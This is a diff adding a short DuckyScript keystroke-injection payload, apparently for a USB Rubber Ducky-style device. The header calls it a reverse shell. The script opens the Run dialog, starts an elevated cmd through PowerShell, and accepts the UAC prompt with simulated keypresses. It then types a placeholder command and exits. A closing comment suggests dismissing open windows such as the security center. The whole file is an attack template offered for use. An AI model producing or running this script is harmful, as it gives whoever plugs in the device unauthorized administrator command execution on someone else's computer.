@@ -1,0 +1,16 @@
+REM running simple reverse shell
+DELAY 2000
+GUI r
+DELAY 300
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 600
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+REM Replace the 'COMMAND' with what command you are looking to run, depedant on the ran cmd, you may need to modify the times in between depedending on response times.
+STRING [COMMAND]
+ENTER
+STRING exit
+ENTER
+REM Another way of exiting not just cmd by running 'exit' you can use the "ALT y" at the end of the script to close out any other windows that are visible on the screen such as search engine, security center, File Systems
